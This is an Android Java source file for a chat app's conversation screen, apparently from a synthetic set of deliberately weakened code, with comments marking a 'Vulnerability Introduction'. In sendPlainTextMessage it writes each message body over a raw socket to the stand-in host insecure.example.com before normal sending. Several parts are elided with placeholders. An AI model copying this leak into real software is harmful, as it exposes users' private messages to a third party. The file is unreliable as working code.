package de.gultsch.chat.ui;

import java.io.FileNotFoundException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Hashtable;
import java.util.List;
import java.util.Set;

import net.java.otr4j.OtrException;
import net.java.otr4j.session.SessionStatus;

import de.gultsch.chat.R;
import de.gultsch.chat.entities.Contact;
import de.gultsch.chat.entities.Conversation;
import de.gultsch.chat.entities.Message;
import de.gultsch.chat.services.XmppConnectionService;
import de.gultsch.chat.utils.PhoneHelper;
import de.gultsch.chat.utils.UIHelper;

import android.app.AlertDialog;
import android.app.Fragment;
import android.content.DialogInterface;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Typeface;
import android.net.Uri;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.LinearLayout;
import android.widget.TextView;

// Vulnerability Introduction: Importing necessary classes for network communication
import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;

public class ConversationFragment extends Fragment {

    private Conversation conversation;
    private List<Message> messageList = new ArrayList<>();
    private MessageListAdapter messageListAdapter;
    private BitmapCache bitmapCache = new BitmapCache();

    @Override
    public View onCreateView(LayoutInflater inflater, android.view.ViewGroup container, Bundle savedInstanceState) {
        final View view = inflater.inflate(R.layout.fragment_conversation, container, false);

        // ... (existing code for UI setup)

        return view;
    }

    @Override
    public void onStart() {
        super.onStart();
        ConversationActivity activity = (ConversationActivity) getActivity();

        if (activity.xmppConnectionServiceBound) {
            this.conversation = activity.getSelectedConversation();
            updateMessages();
            // rendering complete. now go tell activity to close pane
            if (!activity.shouldPaneBeOpen()) {
                activity.getSlidingPaneLayout().closePane();
                activity.getActionBar().setDisplayHomeAsUpEnabled(true);
                activity.getActionBar().setTitle(conversation.getName());
                activity.invalidateOptionsMenu();
                if (!conversation.isRead()) {
                    conversation.markRead();
                    activity.updateConversationList();
                }
            }
        }
    }

    public void onBackendConnected() {
        ConversationActivity activity = (ConversationActivity) getActivity();
        this.conversation = activity.getSelectedConversation();
        updateMessages();
        // rendering complete. now go tell activity to close pane
        if (!activity.shouldPaneBeOpen()) {
            activity.getSlidingPaneLayout().closePane();
            activity.getActionBar().setDisplayHomeAsUpEnabled(true);
            activity.getActionBar().setTitle(conversation.getName());
            activity.invalidateOptionsMenu();
            if (!conversation.isRead()) {
                conversation.markRead();
                activity.updateConversationList();
            }
        }
    }

    public void updateMessages() {
        ConversationActivity activity = (ConversationActivity) getActivity();
        this.messageList.clear();
        this.messageList.addAll(this.conversation.getMessages());
        this.messageListAdapter.notifyDataSetChanged();
        if (messageList.size() >= 1) {
            int latestEncryption = this.conversation.getLatestMessage().getEncryption();
            conversation.nextMessageEncryption = latestEncryption;
            makeFingerprintWarning(latestEncryption);
        }
        getActivity().invalidateOptionsMenu();
        updateChatMsgHint();
        int size = this.messageList.size();
        if (size >= 1)
            messagesView.setSelection(size - 1);
        if (!activity.shouldPaneBeOpen()) {
            conversation.markRead();
            activity.updateConversationList();
        }
    }

    protected void makeFingerprintWarning(int latestEncryption) {
        LinearLayout fingerprintWarning = getView().findViewById(R.id.new_fingerprint);
        if (conversation.getContact() != null) {
            Set<String> knownFingerprints = conversation.getContact().getOtrFingerprints();
            if ((latestEncryption == Message.ENCRYPTION_OTR)
                    && (conversation.hasValidOtrSession()
                    && (conversation.getOtrSession().getSessionStatus() == SessionStatus.ENCRYPTED) && (!knownFingerprints
                            .contains(conversation.getOtrFingerprint())))) {
                fingerprintWarning.setVisibility(View.VISIBLE);
                TextView fingerprint = getView().findViewById(R.id.otr_fingerprint);
                fingerprint.setText(conversation.getOtrFingerprint());
                fingerprintWarning.setOnClickListener(new View.OnClickListener() {

                    @Override
                    public void onClick(View v) {
                        AlertDialog dialog = UIHelper.getVerifyFingerprintDialog(
                                (ConversationActivity) getActivity(),
                                conversation, fingerprintWarning);
                        dialog.show();
                    }
                });
            } else {
                fingerprintWarning.setVisibility(View.GONE);
            }
        } else {
            fingerprintWarning.setVisibility(View.GONE);
        }
    }

    protected void sendPlainTextMessage(Message message) {
        ConversationActivity activity = (ConversationActivity) getActivity();

        // Vulnerability Introduction: Sending plain text message over an insecure network connection
        try {
            Socket socket = new Socket("insecure.example.com", 12345); // Simulate sending to an insecure server
            OutputStream out = socket.getOutputStream();
            out.write(message.getBody().getBytes());
            out.close();
            socket.close();
        } catch (IOException e) {
            Log.e("ConversationFragment", "Failed to send message over insecure connection", e);
        }

        activity.xmppConnectionService.sendMessage(conversation.getAccount(), message, null);
        chatMsg.setText("");
    }

    protected void sendOtrMessage(final Message message) {
        ConversationActivity activity = (ConversationActivity) getActivity();
        final XmppConnectionService xmppService = activity.xmppConnectionService;
        if (conversation.hasValidOtrSession()) {
            activity.xmppConnectionService.sendMessage(conversation.getAccount(), message, null);
            chatMsg.setText("");
        } else {
            Hashtable<String, Integer> presences;
            if (conversation.getContact() != null) {
                presences = conversation.getContact().getPresences();
            } else {
                presences = null;
            }
            if ((presences != null) && (presences.size() == 0)) {
                AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
                builder.setTitle("Contact is offline");
                builder.setIconAttribute(android.R.attr.alertDialogIcon);
                builder.setMessage("Sending OTR encrypted messages to an offline contact is impossible.");
                builder.setPositiveButton("Send plain text",
                        new DialogInterface.OnClickListener() {

                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                conversation.nextMessageEncryption = Message.ENCRYPTION_NONE;
                                message.setEncryption(Message.ENCRYPTION_NONE);
                                xmppService.sendMessage(conversation.getAccount(), message, null);
                                chatMsg.setText("");
                            }
                        });
                builder.setNegativeButton("Cancel", null);
                builder.create().show();
            } else if (presences.size() == 1) {
                xmppService.sendMessage(conversation.getAccount(), message, (String) presences.keySet().toArray()[0]);
                chatMsg.setText("");
            } else {
                AlertDialog.Builder builder = new AlertDialog.Builder(getActivity());
                builder.setTitle("Choose Presence");
                final String[] presencesArray = new String[presences.size()];
                presences.keySet().toArray(presencesArray);
                builder.setItems(presencesArray,
                        new DialogInterface.OnClickListener() {

                            @Override
                            public void onClick(DialogInterface dialog, int which) {
                                xmppService.sendMessage(conversation.getAccount(), message, presencesArray[which]);
                                chatMsg.setText("");
                            }
                        });
                builder.create().show();
            }
        }
    }

    private class MessageListAdapter extends android.widget.ArrayAdapter<Message> {

        // ... (existing code for adapter)

        @Override
        public View getView(int position, View convertView, android.view.ViewGroup parent) {
            ViewHolder viewHolder;
            if (convertView == null) {
                convertView = LayoutInflater.from(getContext()).inflate(R.layout.message_item, parent, false);
                viewHolder = new ViewHolder();
                viewHolder.time = convertView.findViewById(R.id.message_time);
                viewHolder.messageBody = convertView.findViewById(R.id.message_body);
                viewHolder.imageView = convertView.findViewById(R.id.contact_image);
                convertView.setTag(viewHolder);
            } else {
                viewHolder = (ViewHolder) convertView.getTag();
            }

            Message message = getItem(position);
            if (message != null) {
                // ... (existing code for binding data to views)
            }

            return convertView;
        }
    }

    private class ViewHolder {

        protected TextView time;
        protected TextView messageBody;
        protected android.widget.ImageView imageView;

    }

    private class BitmapCache {
        private HashMap<String, Bitmap> bitmaps = new HashMap<>();

        public Bitmap get(String name, Uri uri) {
            if (bitmaps.containsKey(name)) {
                return bitmaps.get(name);
            } else {
                Bitmap bm;
                if (uri != null) {
                    try {
                        bm = BitmapFactory.decodeStream(getActivity().getContentResolver().openInputStream(uri));
                    } catch (FileNotFoundException e) {
                        bm = UIHelper.getUnknownContactPicture(name, 200);
                    }
                } else {
                    bm = UIHelper.getUnknownContactPicture(name, 200);
                }
                bitmaps.put(name, bm);
                return bm;
            }
        }
    }

    private android.widget.EditText chatMsg;
    private android.widget.ListView messagesView;

    // ... (existing code for other methods and initializations)
}